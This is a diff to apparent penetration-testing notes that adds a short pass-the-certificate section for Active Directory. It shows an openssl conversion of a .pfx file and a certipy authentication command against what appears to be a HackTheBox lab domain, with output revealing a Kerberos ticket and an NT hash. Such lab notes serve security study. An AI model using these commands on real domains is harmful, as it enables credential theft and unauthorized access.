@@ -394,6 +394,31 @@ PS C:\tools> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(user
 evil-winrm with .pfx  
 https://notes.shashwatshah.me/windows/active-directory/winrm-using-certificate-pfx
 
+or named Pass-The-Certification
+https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate
+
+e.g.
+
+```
+openssl pkcs12 -in winrm_svc.pfx -out winrm_svc.pem -nodes
+```
+
+```
+└─$ certipy auth -pfx winrm_svc.pfx -username winrm_svc -domain fluffy.htb -dc-ip 10.129.180.230
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[!] Could not find identity in the provided certificate
+[*] Using principal: 'winrm_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'winrm_svc.ccache'
+[*] Wrote credential cache to 'winrm_svc.ccache'
+[*] Trying to retrieve NT hash for 'winrm_svc'
+[*] Got hash for 'winrm_svc@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:33bd09dcd697600edf6b3a7af4875767
+```
+
 
 # Miscellaneous Misconfigurations
 
